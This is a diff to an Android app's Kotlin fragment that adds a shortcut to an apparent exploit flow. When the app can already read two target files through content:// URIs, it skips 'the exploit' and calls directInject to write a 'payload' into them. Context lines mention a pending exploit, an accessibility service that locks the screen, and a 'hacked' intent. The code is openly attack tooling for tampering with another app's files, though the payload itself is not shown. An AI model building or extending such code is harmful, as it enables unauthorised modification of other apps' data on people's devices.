@@ -188,7 +188,17 @@ class HomeFragment : Fragment() {
         val authority = rootPathInfo.first
         val rootName = rootPathInfo.second
 
-        // Step 5: Check accessibility permission (auto-request if needed)
+        // Step 5: Check if we already have URI permissions for both files
+        val uri1 = buildUriStr(authority, rootName, TARGET_FILE_PATHS[0])
+        val uri2 = buildUriStr(authority, rootName, TARGET_FILE_PATHS[1])
+
+        if (hasUriPermission(ctx, uri1) && hasUriPermission(ctx, uri2)) {
+            // Already authorized — skip exploit, directly inject payload
+            directInject(uri1, uri2)
+            return
+        }
+
+        // Step 6: Check accessibility permission (auto-request if needed)
         if (!isAccessibilityEnabled(ctx)) {
             pendingExploit = true
             pendingAuthority = authority
@@ -236,6 +246,38 @@ class HomeFragment : Fragment() {
         Handler(Looper.getMainLooper()).postDelayed({
             ScreenControlService.lockScreen()
         }, 15)
+    }
+
+    private fun buildUriStr(authority: String, rootName: String, filePath: String): String {
+        return if (rootName.isNotEmpty()) {
+            "content://$authority/$rootName$filePath"
+        } else {
+            "content://$authority$filePath"
+        }
+    }
+
+    private fun hasUriPermission(ctx: android.content.Context, uriStr: String): Boolean {
+        return try {
+            val uri = Uri.parse(uriStr)
+            val resolver = ctx.contentResolver
+            val input = resolver.openInputStream(uri)
+            input?.close()
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun directInject(uri1: String, uri2: String) {
+        val activity = requireActivity() as? MainActivity
+        if (activity == null) {
+            showUnsupportedDialog("无法执行注入: Activity不可用")
+            return
+        }
+
+        Thread {
+            activity.injectDirectly(uri1, uri2)
+        }.start()
     }
 
     private fun getHackedIntent(url: String, step: Int): Intent {
